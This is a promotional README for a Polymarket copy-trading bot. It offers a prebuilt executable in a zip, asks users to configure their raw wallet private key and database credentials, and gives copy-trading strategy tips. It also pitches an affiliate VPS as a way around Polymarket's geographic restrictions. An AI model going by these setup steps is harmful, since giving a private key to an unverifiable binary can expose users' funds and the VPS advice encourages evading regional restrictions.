# 🚀 Polymarket Trading Bots
- 🤖 Polymarket Copy Trading Bot
- 📈 Polymarket Arbitrage Bot
- 💹 Polymarket Market Maker Bot

---
## 📞 Contact & Support

- 📱 Telegram: [@soulcrancerdev](https://t.me/soulcrancerdev)
- 🐦 X: [@soulcrancerdev](https://x.com/soulcrancerdev)

---
## 🛠️ Unlock Your Setup & Trading Power with the UI

- 📹 Watch the Telegram UI walkthrough: [Demo Video](https://www.youtube.com/watch?v=8PC0bKSgfhM)  
- 🎯 Explore the Demo: [Demo Bot](https://t.me/poly_copy_tg_bot)  
- 🚀 Launch your trading journey now: [Prod Bot](https://t.me/poly_copy_prod_tg_bot)  

---
## 🚀 Let's Trade!!

### **🤖 Polymarket Copy Trading Bot - Rust (Prod Version)**
- 🗂️ [polymarket-copy-trading-bot-prod.zip](https://github.com/user-attachments/files/25134148/polymarket-copy-trading-bot-prod.zip)

1. 📂 Extract `polymarket-copy-trading-bot-prod.zip` file.
2. ⚙️ Environment Variables Settings
   ```
   - USER_ADDRESSES=0xYourTraderAddress             # Traders to copy (comma-separated or JSON array)
   - PROXY_WALLET=0xYourWalletAddress               # Your wallet (must match PRIVATE_KEY)
   - PRIVATE_KEY=your_64_char_hex_private_key       # Private key without 0x prefix
   - RPC_URL=https://polygon-mainnet.infura.io/v3/YOUR_PROJECT_ID        # Polygon RPC endpoint (you can use Infura, Alchemy, or QuickNode)
   - MONGO_URI='mongodb+srv://user:pass@cluster.mongodb.net/database'    # ⚠️  Keep this private! Never share or commit to git
   - COPY_STRATEGY=PERCENTAGE                       # Copy strategy: PERCENTAGE, FIXED, or ADAPTIVE
   - COPY_SIZE=10.0                                 # PERCENTAGE: Percentage of trader's order (e.g., 10.0 = 10%)
   - MAX_ORDER_SIZE_USD=100.0                       # Maximum size for a single order in USD (default: 100.0)
   - MIN_ORDER_SIZE_USD=1.0                         # Minimum size for a single order in USD (default: 1.0)
   ```
3. ▶️ Run `polymarket-copy-trading-bot-prod.exe`
<img width="824" height="974" alt="polymarket-copy-trading-bot-prod" src="https://github.com/user-attachments/assets/af0bacee-5deb-4091-9a1e-f31115e2e008" />

---
## ✨ Features
- 👥 **Multi-trader support** — Follow several traders at once; your edge is mirroring many minds instead of one.
- 📏 **Dynamic sizing** — Order size scales with your capital and strategy (percentage, fixed, or adaptive).
- 🔝 **Tiered multipliers** — Bigger trades can use different scaling than small ones.
- 📊 **Accurate bookkeeping** — Tracks every buy and sell so positions stay correct even when balances change.
- 📦 **Batched orders** — Groups small signals into fewer, larger orders when aggregation is enabled.
- ⚡ **Live execution** — Sub-second monitoring and immediate placement on the CLOB.
- 💾 **MongoDB-backed state** — All activity and positions stored for replay and analysis.
- 🛡️ **Slippage guards** — Avoids fills at worse-than-acceptable prices.

---
## 🚀 VPS Recommendation – Low-Latency Execution & GEO restrictions support

**Latency = edge** in Polymarket.

**[Trading VPS →](https://app.tradingvps.io/aff.php?aff=60)** is the go-to low-latency hosting solution among serious prediction-market and crypto bot runners.

<img width="803" height="300" alt="image" src="https://github.com/user-attachments/assets/7a3e4ce9-3e8a-4aa2-a8d6-f18dce66ad29" />

- ⏱️ Sub-1 ms to major Polygon nodes  
- 🔒 Crypto/HFT-optimized locations  
- 📈 Exceptional uptime & network performance  

Note: Polymarket has some GEO restrictions, so many Polymarket traders are using our AMS VPS and love it.

---

## 📈 Popular Copy Trading Strategies

1. **🏗️ Build a Portfolio of Traders**
   - 🌐 Diversify across 3-5 traders with expertise in specific markets (e.g., sports, politics, crypto).
   - 📉 Analyze wallet history: P&L curve, win rate, risk-reward, max drawdown.
   - ⭐ Use "Copy Score" (e.g., R² * win rate * profit factor) to rank traders.
   - 🚫 Avoid loud whales; target small quants with steady profits.

2. **📊 Proportional Sizing and Risk Limits**
   - 🔄 Mirror trades proportionally (e.g., if whale risks 5% of $1M, you risk 5% of your portfolio).
   - 🛑 Cap risk at 7% per trade, max 3 open positions.
   - 🧪 Start small (0.1% allocation) for testing.

3. **⚙️ Custom Bot Parameters**
   - 🚫 Skip certain markets or categories.
   - 🔢 Set size multipliers based on trade size/category (e.g., chase spreads for high-volume trades).
   - 🔄 Use retries with FAK/GTD orders; adjust for live vs. non-live markets.
   - 📏 Copy % (e.g., 50-100% of trader's size).

4. **🎯 Target Specific Trader Types**
   - 🤖 **AI Sentiment Bots**: Copy bots that profit from news reactions (5-20 min window).
   - 🔄 **Mean Reversion Bots**: Follow bots snapping up panic dumps.
   - 💎 **Undervaluation Traders**: Mirror those betting on low-attention, mispriced markets (e.g., lower leagues).
   - 📉 **Low/High Price Specialists**: Copy low-entry (0.1¢) high-frequency or high-entry (99¢) near-resolution plays.

5. **🗃️ Wallet Baskets Approach**
   - 👥 Group 5-10 similar wallets; enter only when 80%+ align on the same outcome within a tight price range.

6. **✅ Pre-Copy Checklist**
   - 🖐️ Trade manually first (10-20 trades) to understand risk.
   - 👀 Observe 5-10 trades before automating.
   - 🧠 Match trader expertise to your interests (e.g., skip NHL if unfamiliar).
   - 💧 Ensure liquid markets (min $1M volume) to avoid moving prices.

7. **🔥 Advanced Tips**
   - 🔗 Combine with domain specialization (10-20% allocation).
   - ⚠️ Monitor for adverse selection: Ensure your slippage + fees < trader's edge per share.
   - 📚 Learn from failures: Avoid being exit liquidity or news traps.

## 🤝 Support & Community

⭐ Fork, star, and contribute to the project on GitHub.

📢 For the updates of the current copy trader w/ your tradin' logic, Reach out via Telegram: [@soulcrancerdev](https://t.me/soulcrancerdev)
